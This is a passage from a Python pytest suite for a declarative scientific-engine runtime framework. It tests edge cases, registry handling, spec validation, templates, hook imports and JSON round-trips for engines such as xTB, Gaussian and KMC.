        to_dict() does not include input_files since those are internal
        to the engine runtime and not needed by the frontend.
        """
        for rt in all_runtimes():
            d = rt.to_dict()
            # input_files is intentionally omitted from to_dict()
            # This test documents the design choice
            assert "input_files" not in d or isinstance(d.get("input_files"), dict)


# =========================================================================
# 10. Edge Cases & Error Handling
# =========================================================================

class TestEdgeCases:
    """Framework should handle edge cases gracefully."""

    def setup_method(self):
        _RUNTIME_REGISTRY.clear()

    def test_missing_template_raises_error(self):
        """Referencing nonexistent template should raise appropriate error."""
        from jinja2 import TemplateNotFound

        with pytest.raises(TemplateNotFound):
            _render_template(
                "nonexistent/template.j2",
                {},
                SIMPLE_CU_STRUCTURE,
                "test_node",
            )

    def test_invalid_yaml_is_skipped(self, tmp_path):
        """Malformed YAML in engine_defs/ should be logged and skipped."""
        # Create a temporary invalid YAML file in a custom dir
        # We can't put it in the real engine_defs/ dir, but we can test
        # that load_yaml_engine handles bad data gracefully
        bad_yaml = tmp_path / "bad.yaml"
        bad_yaml.write_text("engine: test\n  bad indentation here\nlabel: [")

        with pytest.raises(Exception):
            load_yaml_engine(bad_yaml)

    def test_missing_required_fields_raises(self):
        """Engine spec missing required fields should raise ValueError."""
        raw = {"engine": "test", "label": "Test"}
        with pytest.raises(ValueError, match="Missing required fields"):
            validate_engine_spec(raw)

    def test_missing_hook_module_raises(self):
        """Hook pointing to nonexistent module should raise ImportError."""
        import importlib

        with pytest.raises(ImportError):
            importlib.import_module("workflow.hooks.nonexistent_hooks")

    def test_unknown_calc_type_returns_none(self):
        """resolve_calc_type with unknown type returns None."""
        raw = {
            "engine": "test_engine",
            "label": "Test",
            "supported_calc_types": [],
            "params": [],
            "input_files": {},
            "run_commands": [],
            "output_files": {},
            "calc_type_mapping": {"geo_opt": "test_relax"},
        }
        rt = DeclarativeEngineRuntime(raw)
        assert rt.resolve_calc_type("nonexistent") is None
        assert rt.resolve_calc_type("geo_opt") == "test_relax"

    def test_engine_with_no_params(self):
        """Engine with empty params list should work fine."""
        raw = {
            "engine": "no_params",
            "label": "No Params Engine",
            "supported_calc_types": [],
            "params": [],
            "input_files": {},
            "run_commands": [],
            "output_files": {},
        }
        rt = DeclarativeEngineRuntime(raw)
        assert rt.spec.params == []
        assert rt.to_frontend_params() == []
        d = rt.to_dict()
        assert d["params"] == []

    def test_engine_with_no_calc_types(self):
        """Engine like KMC with empty supported_calc_types should work."""
        _load_fresh()
        rt = get_runtime("kmc")
        assert rt is not None
        assert rt.spec.supported_calc_types == []
        # KMC has no calc_type_mapping either
        assert rt.spec.calc_type_mapping == {}

    def test_engine_with_no_run_commands(self):
        """Engines like gaussian/gromacs with empty run_commands should work."""
        _load_fresh()
        rt = get_runtime("gaussian")
        assert rt is not None
        assert rt.spec.run_commands == []

    def test_engine_with_no_input_files(self):
        """Engines like gaussian with empty input_files should work."""
        _load_fresh()
        rt = get_runtime("gaussian")
        assert rt is not None
        assert rt.spec.input_files == {}

    def test_duplicate_load_overwrites_registry(self):
        """Loading the same engine twice should overwrite, not duplicate."""
        raw = {
            "engine": "dup_test",
            "label": "First",
            "supported_calc_types": [],
            "params": [],
            "input_files": {},
            "run_commands": [],
            "output_files": {},
        }
        load_engine_def(raw)
        assert get_runtime("dup_test").spec.label == "First"

        raw["label"] = "Second"
        load_engine_def(raw)
        assert get_runtime("dup_test").spec.label == "Second"
        # Only one entry
        assert sum(1 for r in all_runtimes() if r.spec.engine == "dup_test") == 1

    def test_invalid_param_definition_raises(self):
        """Invalid param dicts should raise ValueError."""
        raw = {
            "engine": "bad_params",
            "label": "Bad",
            "supported_calc_types": [],
            "params": [{"key": "x", "label": "X", "unknown_field": True}],
            "input_files": {},
            "run_commands": [],
            "output_files": {},
        }
        with pytest.raises(ValueError, match="Invalid param"):
            validate_engine_spec(raw)

    def test_input_file_spec_validation(self):
        """InputFileSpec should validate correctly."""
        spec = InputFileSpec(template="xtb/run_xtb.py.j2")
        assert spec.template == "xtb/run_xtb.py.j2"
        assert spec.source is None

        spec2 = InputFileSpec(source="structure", format="poscar")
        assert spec2.source == "structure"
        assert spec2.format == "poscar"

    def test_registry_clear_works(self):
        """_RUNTIME_REGISTRY.clear() should empty the registry."""
        _load_fresh()
        assert len(all_runtimes()) == 13
        _RUNTIME_REGISTRY.clear()
        assert len(all_runtimes()) == 0


# =========================================================================
# 11. Cross-cutting: Full Integration
# =========================================================================

class TestFullIntegration:
    """End-to-end tests combining multiple aspects."""

    def setup_method(self):
        _load_fresh()

    def test_load_serialize_all_engines(self):
        """Load all engines, serialize each, verify JSON round-trip."""
        for rt in all_runtimes():
            d = rt.to_dict()
            json_str = json.dumps(d)
            restored = json.loads(json_str)
            assert restored["engine"] == rt.spec.engine

    def test_all_calc_types_in_unified_map(self):
        """Every calc_type from every engine should be in the unified map."""
        calc_map = build_unified_calc_map()
        for rt in all_runtimes():
            for calc_type in rt.spec.calc_type_mapping:
                key = (calc_type, rt.spec.engine)
                assert key in calc_map, (
                    f"({calc_type}, {rt.spec.engine}) not in unified calc map"
                )

    def test_template_engines_have_templates(self):
        """xTB and MLP define templates in their input_files; those files should exist."""
        for engine_key in ["xtb", "mlp"]:
            rt = get_runtime(engine_key)
            assert rt is not None
            for filename, file_spec in rt.spec.input_files.items():
                if file_spec.template:
                    template_path = TEMPLATES_DIR / file_spec.template
                    assert template_path.exists(), (
                        f"Engine {engine_key}: template {file_spec.template} "
                        f"not found at {template_path}"
                    )

    def test_hook_engines_have_hook_modules(self):
        """Engines with hooks should reference importable modules."""
        import importlib

        for rt in all_runtimes():
            for hook_name, hook_path in rt.spec.hooks.items():
                if hook_path is None:
                    continue
                if ":" in hook_path:
                    module_path, func_name = hook_path.rsplit(":", 1)
                else:
                    module_path, func_name = hook_path, "run"
                try:
                    mod = importlib.import_module(module_path)
                    assert hasattr(mod, func_name), (
                        f"Engine {rt.spec.engine}: hook module {module_path} "
                        f"has no function {func_name}"
                    )
                except ImportError:
                    # lammps_hooks has a known issue with its import path
                    # (uses hooks/lammps_hooks instead of workflow.hooks.lammps_hooks)
                    if "lammps" not in hook_path:
                        pytest.fail(
                            f"Engine {rt.spec.engine}: cannot import hook "
                            f"module {module_path}"
                        )

    def test_engines_with_supported_calc_types_have_mappings(self):
        """Every supported_calc_type should have a corresponding mapping."""
        for rt in all_runtimes():
            for ct in rt.spec.supported_calc_types:
                assert ct in rt.spec.calc_type_mapping, (
                    f"Engine {rt.spec.engine}: supported_calc_type {ct!r} "
                    f"has no calc_type_mapping entry"
                )

    def test_description_is_always_string(self):
        """Description should always be a string (possibly empty)."""
        for rt in all_runtimes():
            assert isinstance(rt.spec.description, str)

    def test_safety_values_are_valid(self):
        """All safety values should be in the allowed set."""
        for rt in all_runtimes():
            assert rt.spec.safety in VALID_SAFETY_VALUES, (
                f"Engine {rt.spec.engine}: safety={rt.spec.safety!r} not valid"
            )
